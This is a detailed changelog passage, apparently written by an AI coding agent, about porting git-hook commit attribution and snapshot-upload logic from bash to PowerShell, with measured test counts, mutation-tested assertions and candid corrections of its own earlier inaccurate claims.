  - **Measured suite counts**, from a run at this commit rather than an estimate: **ps1 961 passed / 0 failed**, **bash 787 passed / 0 failed**, by `pwsh -NoProfile -File hooks/test-stride-hook.ps1` and `bash hooks/test-stride-hook.sh`. Assertion *call sites* are 754 ps1 against 594 bash; the executed totals differ because both suites loop over tables. At the start of G413 the ps1 suite was **530** — CHANGELOG's W2100 entry records "593 passed (was 530)", so 593 is the figure *after* G413's first child, not before it. G413's ps1 growth is therefore 431 assertions, not 368. I first wrote 593 by quoting a recorded number instead of reading which side of the change it sat on, which is the same class of error this entry exists to prevent.
  - **WHAT IS NOT PORTED, stated plainly because an over-claim here is the hazard this goal exists to remove.** **Three items covering four distinct gaps**, none closable from this host — the first draft said "three things" and scoped the 5.1 failure to one call site, missing a second consequence of the same parameter:
    - **`Invoke-WebRequest -SkipHttpErrorCheck` at BOTH call sites (D277)** — `hooks/stride-hook.ps1:3651` and `:4931`. The parameter is PowerShell 7.0+, so on 5.1 binding fails *before* the request is issued. At `:3651` (`Invoke-ChangedFilesUpload`) the PUT never happens and is recorded as `000`, indistinguishable from a refused connection: a native-Windows run now **writes** a snapshot and still cannot **upload** one. At `:4931` (`Invoke-AfterGoalDetectionViaApi`) the call sits under `catch { return }`, so **D119 after_goal detection degrades to a silent no-op on every 5.1 run** — a second consequence of the same parameter that my first draft of this entry missed while calling the list complete.
    - **Runtime verification on a real 5.1 host (D237).** Every check in this repo is static: `scripts/check-ps1-compat.sh` reads syntax and cmdlet names, and the ps1 suite runs under pwsh 7. Nothing executes `stride-hook.ps1` under `powershell.exe`. D277 was found by *reading*, not by a red gate — which is the evidence for how much this gate cannot see, and why D237 cannot be closed without a Windows machine.
    - **`refused_base=yes`**, unported at both bash write sites. Diagnostic only: nothing in either executor or either suite reads it.
  - **Two smaller divergences remain recorded where a reader will meet them** rather than here: the self-heal does not RE-capture over an existing snapshot (deliberate — the snapshot on disk is the primary capture's answer), and `Set-TaskRecord` rewrites the cache without a lock, filed as **D282** — which is a **shared** exposure, not a ps1-only one: all four bash record writers pipe `grep -v` into `write_env_cache`'s `mktemp`→`cat`→`mv -f` (`stride-hook.sh:1362`, `:1436`, `:1894`, `:2597`, `:1238-1262`), the same read-filter-rewrite. An earlier draft of this entry and the in-code note both claimed bash *appends*; it does not, and both are corrected in place. The `sh 11` live-server round-trip has no ps1 counterpart, so **the ps1 base64 envelope shape has never been proved acceptable to a real server by either suite**.
  - **W2105's entry contradicts itself and is reconciled here rather than rewritten.** Its bullet reads "750 ps1 assertion call sites … executing 957" while its own closing bullet reads 961: the W2105 review commit `c53ba2f` updated one and not the other. Measured, the call sites are 750 at `32aeb57` and **754** at `c53ba2f`, and the executed total is **961**. Both of W2105's figures were true when first written and one was left behind by its own follow-up.
  - **No historical entry was rewritten.** The W2100 entry still describes the capture gap as it stood, and the earlier "PowerShell parity" entries still describe theirs. They are the record of what was true when written; this entry is the record of what changed.
  - **Every parity claim above now names what establishes it** — a file:line, a grep, or a suite run — per this task's security consideration. That was NOT true of the first draft, and the review is what established it: two of its claims (bash "appends"; the ps1 suite "was 593") named no verifying command and were both false, and the unported list was presented as exhaustive while a fourth 5.1 gap existed. The list is now three items covering four gaps, and is bounded to *this host*: it enumerates what reading and the static gate can find, and cannot enumerate what only a 5.1 runtime would reveal.
  - **The one claim no command can verify — that the hook *runs* correctly on 5.1 — is stated as unverified rather than as parity.** D277 was found by reading rather than by a red gate, which is the evidence for how much of that surface is unexamined.

- **W2105 — the six bash-only test groups now have PowerShell counterparts, and `check-skill-budgets` has a PowerShell twin so a Windows-only contributor still gets the drift detector.** Two of the six needed no new group: `sh 9` (after_goal routing) and `sh 11` (the PUT round-trip) were already mirrored under ps1 Groups 8 and 7, and `sh 24`'s D228 assertions were already ps1 8d1–8d4. The suites diverge in numbering from `sh 7` onward, so mirroring by number would have produced duplicates and called it coverage; the mapping was established by reading each group, and it is recorded in a new coverage ledger at the foot of the ps1 suite rather than left as an impression.
  - **The hermeticity gate now tests itself (ps1 Group 27).** It is load-bearing for every assertion beneath it and nothing asserted it — the same reason its bash twin exists. A `--gate-probe` mode reports the post-gate state so the gate is observable from outside: 27a–27e pin that it names an inherited variable, never prints its **value** (a canary in each of the two reporting paths, since one covers the fixed list and the other the open-ended `TASK_BASE_REF_*` sweep), actually clears rather than merely reporting, preserves the value and warns under the documented opt-out, and stays silent on a clean environment.
  - **`scripts/check-skill-budgets.ps1` mirrors the bash script, and 28b asserts they agree line for line** rather than merely both exiting 0 — two drift detectors that disagree about a budget detect nothing. It reads raw bytes (`ReadAllBytes().Length`, matching `wc -c`) rather than decoded text, which is what the task's own CRLF/multi-byte edge case is about.
  - **ps1 Group 29 mirrors all five `sh 22` D220 routing cases**, including the heredoc delimiter derivation and ANSI-C escape handling that an earlier draft of the ledger recorded as unmirrorable "because this port has no heredoc scanning". It has both `Get-StrideHeredocDelim` and `Remove-StrideHeredocBodies`, and the extraction fails without them. **An omission ledger that invents reasons is worse than one that omits loudly**, so the wrong claim is corrected in place rather than dropped.
  - **The group extracts its dependency closure instead of naming it.** Hand-listing the functions meant adding one, running, reading the next `NOT RECOGNIZED` error and adding that — and a hand-list rots the first time the hook grows a helper. Seeding with the four entry points and pulling in any hook function a seeded body names, to a fixpoint, gets **9** today and stays correct without maintenance. (I first wrote 6 — the harness prints the real count, so it was checkable from the run I had already made.)
  - **Two stale reduction notes are corrected (acceptance criterion 3).** Both said "the ps1 has no capture step" — W2100 built it and Group 21 covers it. So `sh` Groups 12 and 13 are no longer *reduced* into ps1 Group 9: their capture half lives in Group 21 and their upload/self-heal half in Group 9, which is a split rather than a loss.
  - **The differential is recorded as a number** (acceptance criterion 4): 750 ps1 assertion call sites against 594 bash, executing 957 and 787 respectively. The ps1 suite is not a subset — it carries the whole attribution-port coverage plus these groups, while bash keeps the host-agnostic repo gates.
  - **The review found the ledger claiming coverage that does not exist, and that is now recorded honestly.** `sh 11` is an opt-in round-trip against a *real* server that reads the persisted `changed_files` back — its own banner says it exists because stub-only tests "missed a body-shape regression because they never crossed the wire". ps1 Group 7 is the mirror of `sh 8` and its listener stub compares the request body it just sent against the local snapshot, so the regression class `sh 11` guards is invisible to it. Mirroring it needs an E2E gate the ps1 suite does not have; **the ps1 base64 envelope shape has never been proved acceptable to a real server by either suite**. `sh 9` and `sh 24` are likewise *partially* mirrored, and the ledger now names the seven and three behaviours respectively that are not — including `24i`, where an unwritable `.stride/` must not stop the section running, and whose nearest ps1 case would pass while the quality gate silently never ran.
  - **Three assertions in the new hermeticity group could not fail.** The probe prints `AFTER_GATE:<NAME>=…` for every name it knows, so asserting a name against the child's whole output passed with the gate's report deleted — and with the gate deleted. They are now scoped to the report itself. A new 27f pins the two variables that carry the actual risk (`CLAUDE_PROJECT_DIR`, which aims hook code at a directory, and `TASK_BASE_REF`, which selects the git range a capture walks); before it, both the probe and the harness iterated the *same list the gate iterates*, so shrinking the gate shrank its test in lockstep. **And the group's scope is now stated rather than implied: it covers environment neutralisation, not network or repository isolation** — the task's manual test of introducing a real network call and repo mutation was not performed.
  - **The 5.1 gate did not cover the file this task added.** Its default scope was `hooks/*.ps1`, so nothing automatic ever scanned `scripts/`, and a 7-only construct there would have failed only on a user's Windows box — the exact class the gate exists for, in the one place nobody was looking. The default now covers both directories, which also closes the same hole for the pre-existing `scripts/check-ps1-compat.ps1`.
  - **One thing could not be fixed from here and is recorded instead:** the bash suite's Group 29 banner says host-agnostic repo gates live in the bash suite only "as with Group 28". That is now stale for Group 28, and `hooks/test-stride-hook.sh` is read-only for this task.
  - ps1 suite: **961 passed, 0 failed** (was 932). bash suite **787 passed, 0 failed**, both bash files byte-unchanged. 5.1 static gate clean across all four `hooks/*.ps1` and both `scripts/*.ps1` — now by default rather than by a manual invocation.

- **W2104 — the D256 purity fixpoint, the D271 outermost-task gate and the D272 ratchet are now pinned on the PowerShell side, and the task's premise turned out to be a coverage gap rather than a porting gap.** All three mechanisms were already implemented: `Get-AttributedCommitRange`'s Phase C classifies smallest-set-first with subset-not-intersection (D256), `Invoke-FinalizeAfterDoing` unions the owned range with the attributed ranges when no other window is open instead of replacing them (D271), and the self-heal takes the same gate through the replayed verdict. What did not exist was any assertion for the D272 ratchet or for the D271 union branch. Verified by reading rather than by grepping bash names — the same correction W2102's and W2103's premises needed.
  - **The parity note claimed a test that was never written.** W2102 recorded sh 23v2's k=3..k=8 sub-blocks as deferred *"because the k=2 sub-block below pins that this port REPRODUCES the ratchet"* — and there was no k=2 sub-block, nor any other D272 assertion anywhere in the ps1 suite. The deferral was defensible; the thing it rested on was not. Group 26 now mirrors k=2, the terminal k=3, and the empty-window edge, driven end to end through real claim and completion cycles, because the ratchet is a property of what a *sequence* of completions does to each other's snapshots and no unit call can express it.
  - **The ratchet is pinned, not fixed, exactly as the task instructs — and both sides were re-measured against their finished suites, because every recorded figure here turned out to be stale at least once.** Applying the fix bash declined costs **8** assertions on this side (26a×2, 26b×3, 26f×2, 26g — all ratchet family, no collateral) and **16** on bash: seven ratchet plus the nine collateral fallback-world pins. bash was measured by copying both bash files to a scratch directory and mutating the copy, with an unmutated baseline run to separate three failures that are artifacts of running outside the repo; `stride-hook.sh` itself was never touched. Like for like that is **8 vs 7 on the ratchet and 0 vs 9 on the collateral** — the one extra here being a control bash has no counterpart for. So the ratchet is now pinned marginally more tightly on this side and the collateral not at all, which is the real gap and the honest reason neither number licenses revisiting bash's decision.
  - **Getting to those two numbers took correcting two stale ones, and the second correction is the more interesting mistake.** The first version of this bullet said four — measured before round 1 added three cases, never re-run. Correcting that, it then compared the re-measured eight against bash's *four*, taken from bash's own write-up, which is stale in exactly the same way: it is k=2 plus k=3 alone, from before `sh 23v2` grew its remaining four sub-blocks, and bash's recorded "665 → 652, 13 failed" describes that earlier state too. **Importing another document's un-re-measured number while fixing your own is the same defect twice, one level apart.** Both corrections are recorded beside their predecessors rather than overwriting them.
  - **The D271 union branch had existed since W2102 with nothing driving it.** Reaching it needs an exact geometry — a closed nested window so the attributed ranges are non-empty, no other open window so the gate takes the union arm, and manual outer commits on both sides of the nested window so replacing is observably lossy. A simpler fixture passes either way, which is why none of the existing ones caught it. Reverting the union to a replace now drops both of the outer task's manual commits: the silent under-report D271 exists to prevent.
  - **Round 1 caught me replacing W2102's false claim with one of my own, which is the defect this task exists to correct.** My correction said the remaining sub-blocks were "k=4..k=8 ... the same shape at greater depth". `sh 23v2` has no k=4..k=8. It has six sub-blocks, and the three still unmirrored were distinct victim and observability classes — two of them named in this task's own `testing_strategy`. A ledger that describes away what it omits is worse than one that omits loudly. All six are now mirrored (26a, 26b, 26c, 26e, 26f, 26g), and both false claims are recorded in the ledger rather than quietly replaced.
  - **The declared integration test and two declared edge cases had no counterpart.** `sh 23z6`'s 22-nested-completion union is now 26h — not the same case as W2103's 22s, which drives 22 *open* windows through a claim where this drives 22 *closed* windows through completions. The depth-3 grandchild (26f) pins that the victim is decided by depth rather than by being outermost, and that the middle task's loss is silently *partial* — a non-empty snapshot, no sentinel, nothing for a reviewer to notice. The uncommitted-WIP case (26g) pins the observability point that matters most: the empty snapshot is not this defect's signature, because any uncommitted work makes the same terminal loss upload an ordinary-looking snapshot.
  - **Two of my own cases named the wrong mutation, which is the same defect as an assertion that cannot fail.** 26c claimed to catch an implementation that let any childless completion subtract — it does not, since such an implementation still subtracts nothing from an empty window; what it really pins is the base-exclusive rev-list expansion. And 26i's junk cache line was *unstamped*, so it was rejected on the age branch and the case passed with the candidate validation deleted; it now carries a fresh stamp built with the writer's expression, and fails when that validation goes.
  - **Three other claims about this suite were wrong and are fixed.** `New-D226Repo`'s comment said dropping the `/.stride/` ignore line stopped hiding "an artifact the bash twin surfaces as a snapshot path" — it surfaces no such path, because *both* hooks hard-exclude `^\.stride/` from the capture by design; the rationale inverted the fact it cited. 26b's replacement exclusion argued that a sibling task's successful completion proved base resolution worked "in this repo", but a refused base is per *task* — the canonical way this task gets one is eviction of its own anchor, the very D268/D274 shape W2103 fixed — so it now asserts the anchor directly, as 22s does. And the Group 24 omission ledger did not record the fallback-world cases or `sh 23z4`/`23z5`, while the Group 26 banner named them: two records of what this suite covers should not disagree.
  - ps1 suite: **932 passed, 0 failed** (was 907). bash suite **787 passed, 0 failed**, both bash files byte-unchanged. 5.1 static gate clean across all four `hooks/*.ps1`. `hooks/stride-hook.ps1` is **unchanged by this task** — verified by `git diff --stat` against W2103's final commit showing only the test file and this changelog.

- **W2103 — `stride-hook.ps1` now evicts window records per window instead of by count, closing a defect the Windows side had been carrying since D268.** The ps1 kept a per-family `Select-Object -Last 19/20` tail cap that bash abandoned: it evicts the OLDEST record, which is structurally the longest-lived OUTER task's own anchor. D274 then found that capping *open* windows by count reaches the same defect from the other side — the cap keeps the newest opens and drops the oldest, and the oldest open window is structurally the live enclosing outer. Measured on the hook itself: **19 concurrently open children left the outer intact, 20 lost both its anchor and its deliverable**, completing with an empty snapshot over real commits. `Select-KeptWindowRecord` and `Get-DeadOpenWindowId` replace both cap sites, and test group 25 pins that boundary at 19, 20 and 22.
  - **Open windows are never evicted by count at all.** The only ones removed are those the sweep *proved* dead, and it proves that from **non-resolution alone**. It deliberately does not check ancestry or the age stamp the way `Test-AnotherOpenWindowExists` does, and sharing that logic would reintroduce D274 through a different door: ancestry is a property of where HEAD points *right now*, so a bisect or a detached checkout makes a live outer's base a non-ancestor — skipping such a base is recoverable when HEAD returns, deleting its record is not. A base that is not even SHA-shaped is kept rather than swept, because unusable is not the same as provably dead.
  - **The D273 replay is ported too, and the thing that blocked it is gone.** W2102 recorded `replay_narrowing_decision` as unportable because `Write-DiffUploadState` persisted no `base=`/`narrowed=` line to replay *from*. Those lines are now written, `Resolve-CaptureNarrowing` prefers the per-task record over the state file — the file holds one task and is truncated on every write, so an interleaved completion erases it exactly when it is needed — and the self-heal replays the capture-time verdict instead of re-deriving it against retry-time state.
  - **A latent divergence was fixed by construction.** The claim-side cap omitted `TASK_BASE_REF_UNPROVEN` from its filter where bash and the other cap site both exclude it. Rather than patching one site, the exclusion lives in the selector, so both are correct at once.
  - **One test fixture was wrong in a way that hid a real mutation.** The detached-HEAD case detached onto a *descendant*, so its seeded bases were still ancestors — adding an ancestry check to the sweep passed the whole suite. The fixture now uses a genuinely divergent branch and carries a control asserting the base really is not an ancestor, so it cannot quietly stop diverging.
  - **Round 1 review found the one production consumer of the new replay was unreachable.** The self-heal's owned-set override was gated on `$script:SnapOwnedRecorded`, a process-local variable set only inside the `after_doing` invocation — while the self-heal runs in `before_review`, a different process, so the flag was always `$false`. bash reads the durable `TASK_OWNED_<id>` record for exactly that reason: the record survives across processes, the variable does not. That was acceptance criterion 5 failing while every unit test passed.
  - **A missing `git` guard could have erased every window record.** `Get-DeadOpenWindowId` called `& git` unguarded under `$ErrorActionPreference = 'Stop'`, so on a host without git the terminating error was caught by the claim rewrite, which set its kept list to empty — the exact inverse of the function's own fail-safe contract, and of the defect the whole task exists to close.
  - **Four assertions survived mutations of the code they existed to pin**, and the fixes are worth naming because each was a fixture that could not distinguish the thing it named: counting 20 survivors and checking the oldest was evicted holds even if the downward walk starts one index off (only the *identity* of the evicted set changes, so the boundary 505-out/506-in is now pinned); the reserve decrement never decided anything because every fixture window had a live base; the strict `-le` threshold had no fixture at exactly the threshold; and the `TASK_BASE_REF_UNPROVEN` exclusion this task fixes "by construction" was asserted nowhere. All four mutations now fail.
  - **The narrowing fall-through was also unfalsifiable.** Its fixture seeded no open window, so a live check answered "no" anyway and replacing the fall-through with a bare `return $false` passed. It now seeds a real open window with a fresh stamp, so the absent-verdict case answers *yes* while a recorded `no` still answers *no* — same cache, opposite answers, which is the whole point of persisting the verdict.
  - **Round 2 found that the round-1 fix had opened a door the broken version could not reach.** The self-heal read `narrowed=` out of the state file without checking the file's `task_id=` belonged to this task — and that file holds one task and is truncated on every write, which is the interleaved-completion case D273 exists to close. While the replay was gated on unreachable process-local state it could never be wrong, because it never ran; making it reachable made the missing guard live. bash gates the same read on the same terms, and now so does this. A foreign verdict is discarded, which the resolver reports as "none on record" and the replay turns into a live check — the documented fall-through, and the safe answer.
  - **The retry now persists the verdict it APPLIED, not the one it replayed, and to both carriers.** A replayed `yes` whose owned range comes back empty uploads *wide*, so recording `yes` would make the record false about the snapshot the server actually holds — and the next reader would replay that falsehood. It also re-records the per-task value rather than leaving it stale.
  - **Two controls this work added were themselves unfalsifiable**, which is the same defect the round found in four assertions the round before. The CR/LF/NUL refusal — the hardening that stops an injected `narrowed=` line sitting ahead of the genuine one in a first-match-wins reader — had no assertion at all; deleting it left the suite green. And the no-open-window branch of the downward walk was exercised by no fixture, because every other case seeds an open window, so mutating it silently dropped the newest closed window from an all-closed cache — the ordinary steady state for a single sequential agent, not a corner. Both now fail under their mutation.
  - **Round 3 confirmed all six round-2 fixes and then found that the round-2 fix itself had nothing that could falsify it** — the third consecutive round with that shape. Deleting the new `task_id` gate left all 856 assertions green, because the only cases that touch `narrowed=` are Group 25 units that never call the self-heal at all. It is now driven end to end, and the fixture is built so the two answers diverge *observably* rather than as a flag: a foreign `yes` narrows the upload to one commit and a file vanishes from the diff a reviewer would have seen. The refusal path got the same treatment, since its fix was equally unpinned.
  - **The refusal path was persisting a verdict it had not applied.** bash initialises `_retry_narrowed=no` outside every branch and writes both carriers unconditionally; this port initialised it *inside* the non-refused branch, so a refused base carried the replayed value into the state file and never touched the per-task record — a record claiming `yes` over a snapshot that is `[]`, which is narrowed by nothing. The two carriers could then disagree with each other and with the upload.
  - **A guard tested on one third of its character class is a guard tested on none of the cases that differ.** Both `[\r\n\0]` injection fixtures carried a bare LF, so narrowing the class to `[\n]` left every assertion green. CR is not decorative: .NET's line reader treats a lone CR as a terminator, so a CR-bearing value still lands an injected `narrowed=` line ahead of the genuine one. Each member is now pinned separately, on both parameters — and the first draft of those assertions counted only the *genuine* line, which stays at 1 while the injected one wins the first-match read, so they were rewritten to count what actually decides the outcome.
  - **The selector was pinned and its wiring was not.** Group 25 drives `Select-KeptWindowRecord` directly, and the two claim-path cases ran over a one-window cache — which survives the new selector and the old tail cap alike, so reverting either production call site to `Select-Object -Last 19/20` left the suite green. Test 22q drives a real claim over 23 open windows against both. Mutating each site alone also settled which claim reaches which: the parseable claim drives both sites, the unparseable one only `Invoke-FinalizeBeforeDoing`, which is why both cases exist.
  - **Round 4 found the mirror image of round 3's finding: the suite pinned that the retry does not narrow when it must not, and never that it narrows when it must.** The D273 replay's only production consumer — the owned-set override round 1 rewired from a process-local flag to the durable `TASK_OWNED_<id>` record — survived three separate mutations with the whole suite green, including reverting it to the exact round-1 defect. The unpinned direction was the one whose failure is an **under-report**: another task's commit riding along in this task's review. Test 9l is 9j with one byte of fixture changed — the recorded verdict is this task's own — so the geometry inverts and the file that must vanish, vanishes.
  - **9k's control did not control anything, and the fixture would have drifted silently.** It asserted an empty snapshot as proof the refusal fired, but that repo has one commit and a clean tree, so a build that did *not* refuse produces `[]` too. It now asserts the refusal's own stderr, which comes from one branch and nowhere else.
  - **The truncating state write was deleting the base it was supposed to preserve.** On the ordinary retry path nothing recomputes a base, and `$healBase` was seeded empty — so the write dropped the `base=` line the primary capture had persisted. Inert on this side (nothing here reads it as a revision) but not across executors: bash *prefers* the persisted base over re-resolving, precisely because re-resolving after the section's own `git push` can make a correct base look stale and recompute to HEAD — an empty snapshot (D142). It is now carried through, gated on `task_id` exactly as the verdict beside it, and dropped on the refusal path where bash's own base is empty.
  - **A test-harness contamination made the new end-to-end case pass under the very mutation it exists to catch.** `Invoke-HookScript` copies the *test process* environment into the hook child, and Group 22's unit cases leave `TASK_BASE_REF_42` set — so with the outer's anchor evicted the child read that inherited value instead of refusing, failed to resolve it, fell back to `HEAD~1`, and produced a plausible non-empty snapshot. Both payoff assertions passed over a run that had reproduced the defect perfectly. The case now uses an id no other test touches and clears it first. This is the fourth distinct shape of vacuity found on this task, and the first caused by the harness rather than by an assertion.
  - **Round 5 found the refusal-branch line added in round 4 was itself unfalsifiable — the fourth consecutive round where a line written to close a finding shipped unpinned.** Rather than test it, the ordering it patched around was adopted: bash's self-heal *prefers* the base this task persisted over re-resolving, and only calls the selector when nothing is on record. Re-resolving re-judges against origin refs the `after_doing` section's own `git push` may have moved, so a correct base looks stale and recomputes to HEAD — an empty snapshot (D142). Taking bash's ordering also makes the refusal reachable only where bash reaches it, so the base on that branch can only be empty and the explicit clear stops existing rather than needing coverage.
  - **The harness was contaminating its own children, and the class is now closed rather than the instance.** `Invoke-HookScript` copied the whole test-process environment into every hook child, and `Get-TaskBaseRefFor` reads the environment rather than the cache — so a `TASK_BASE_REF_42` left set by an unrelated unit case silently answered for the cache. Only one case was actually weakened, but "only one is wrong today" does not survive the next case anyone adds. The record families are stripped by default with an explicit opt-out, and 9k2 pins the guard directly, because a harness guard is the one thing no other test can fail for. **Its first version stripped nothing**: `ProcessStartInfo.Environment` arrives pre-seeded from the current process, so filtering what gets *added* to it changes nothing — 9k2 failed on the first run, which is exactly why it was written before the guard was trusted.
  - **Round 6: the guard the round-5 change deliberately skips had never once run in a ps1 test.** `Resolve-SnapshotBaseTrust` returns its argument unchanged when no remote head resolves, and no fixture in the file had ever created an origin — so adding the guard back onto the persisted-base branch, which is exactly the D142 emptying the new comment warns about, left all 901 assertions green. 9n now builds a real remote: `origin/main` at B, HEAD at C, the persisted base at A. Skipping the guard keeps A and B's file is in the diff; applying it snaps A to the branch point and B's file disappears. That also gives `Resolve-SnapshotBaseTrust` its first ps1 coverage of any kind.
  - **The new harness strip was case-SENSITIVE, against a rule this file's own loader states for the same key namespace.** Case-sensitivity is safe on an allow-list, because it can only admit less; on a *gate* it admits less gating. Windows environment variables are case-insensitive and Windows is the shipping host, so `Task_Base_Ref_42` is the same variable to the child and would have walked straight through the strip — reopening the class the strip closes. It cannot be pinned from macOS, where env names really are case-sensitive, so the rule is followed and the reason recorded rather than tested.
  - **Three comments were asserting things the code does not do**, which on a task whose every round has turned on exactly that is worth fixing rather than tolerating: the narrowing record's stated lifetime ("the next claim drops it wholesale") ignored the retention re-emit that carries it for as long as its window survives; "BOTH carriers, as bash does" was true of two of the three things bash writes on the refusal path, with `refused_base=yes` unported and unlisted — now recorded in the parity note as a deliberate diagnostic gap; and the sweep's "no git at all below the threshold" ran a `Get-Command` lookup above it, now reordered so the sentence is literally true.
  - **Round 7 approved the work and still found two things, one of them another control that survived its own drift.** 9n's branch-point control asserted a NEGATIVE — the branch point is not the persisted base — which passes when `git merge-base` cannot run at all and returns an empty string, i.e. over exactly the missing-origin drift it names. Deleting the fixture's push and fetch failed the first control and left this one green. It now asserts positively against the pushed commit's own sha, so it fires under both drifts. That is the seventh time on this task a control has turned out to survive the absence of the thing it controls for.
  - **The state file was written with `Set-Content -Encoding UTF8`, which on the shipping host is neither UTF-8 nor newline-terminated the way bash reads it.** Windows PowerShell 5.1 emits a UTF-8 BOM and CRLF, and bash reads this file with `grep '^task_id='` — so a BOM makes the identity line unmatchable and bash discards the whole file, including the `base=` and `narrowed=` this task exists to persist, while a CR-suffixed verdict turns bash's `case yes)` into a miss. The writer predates this work, but two comments added here rest their reasoning on cross-executor durability that did not hold on the only host where it matters. It now uses the same BOM-free `WriteAllText` as the snapshot writer, and 25k2 asserts the bytes.
  - **Round 8 approved it and corrected a claim I had made in the other direction — I talked a live assertion down into a dead one.** I recorded 25k2 as inert on the development host; the reviewer built all four writer spellings and measured that `UTF8Encoding($true)` and `` `r`n `` separators each turn it red on pwsh 7 as readily as on 5.1. Only the single `Set-Content` revert is invisible here, and even that is caught on any Windows host. Understating coverage is the same defect as overstating it — both leave the next reader believing something untrue about what is pinned — so the claim was narrowed in all three places it appeared.
  - **`Invoke-ReplayNarrowingDecision` compared the replayed verdict with `-eq`, which is case-insensitive.** bash's `case yes)` is exact, and it says why at `stride-hook.sh:1846`: a truncated write, a hand-edited line or a tampered file must fall through to the WIDE path, because wide over-reports while narrow can lose this task's own work. The port took the less safe direction on exactly those inputs. This is not the round-6 harness rule in reverse — that one widened a gate over Windows environment variable *names*, which really are case-insensitive; this compares a value read out of a file, where no platform argument applies. Now `-ceq`, pinned by a mixed-case row in 25j.
  - **Two comments were repaired rather than left**: the parity note's self-heal bullet had been spliced into giving, as the reason it never re-captures, the very fact that removed the old reason — plus an orphaned fragment and a duplicated sentence; and `Get-DeadOpenWindowId` read `$Matches[1]` across an intervening regex match, correct today only because a failed `-match` leaves the previous match intact. The id is now captured immediately, as its sibling already did.
  - ps1 suite: **907 passed, 0 failed** (was 856 at round 3's start). bash suite **787 passed, 0 failed**, both bash files byte-unchanged. 5.1 static gate clean across all four `hooks/*.ps1`. Every control added across rounds 3, 4 and 5 was mutation-verified: removing the `task_id` gate fails 4, reverting the applied-verdict hoist fails 3, narrowing the CR/LF/NUL class fails 8, capping either selector call site fails 22q and 22s, reverting the owned-set override to the process-local flag fails 9l, dropping or ungating the base carry fails 9m, disabling the foreign-owner refusal fails 9k's control, dropping the persisted-base preference fails 9n, re-running the trust guard on the persisted base fails 9n, and removing the harness env strip fails 9k2.


- **W2102 — the window classification and snapshot-base selection engine is ported to `stride-hook.ps1`, closing the over-report an outer task's snapshot carried on this host.** Before this, an OUTER task's snapshot contained the commits its NESTED tasks made: the engine that decides which commits belong to the completing task existed only in bash. `Get-AttributedCommitRange` mirrors `attributed_commit_ranges` (D236 windows, the D244 purity heuristic and the D256 fixpoint over it), `Get-OwnedCommitSet` and `Convert-OwnedSetToRange` mirror the D255 owned-set pair, and `Test-AnotherOpenWindowExists` mirrors the D271/D273 gate including its age horizon.
  - **The task's premise was partly wrong, and the correction matters.** It listed five functions as having "zero occurrences" in the ps1 — but that was a grep for the *bash* names. `resolve_snapshot_base` and `select_task_snapshot_base` were already ported as `Resolve-SnapshotBaseTrust` and `Resolve-TaskSnapshotBase`, faithfully, including both refusals. Acceptance criterion 4 was therefore already met, and the work on it was to avoid REGRESSING it rather than to build it.
  - **Five commits, each changing exactly one observable property**, so a regression names its own cause: engine functions with no call sites → retention re-emit → writers wired with snapshots deliberately unchanged → ranges consumed (the only commit that changes capture output) → parity note.
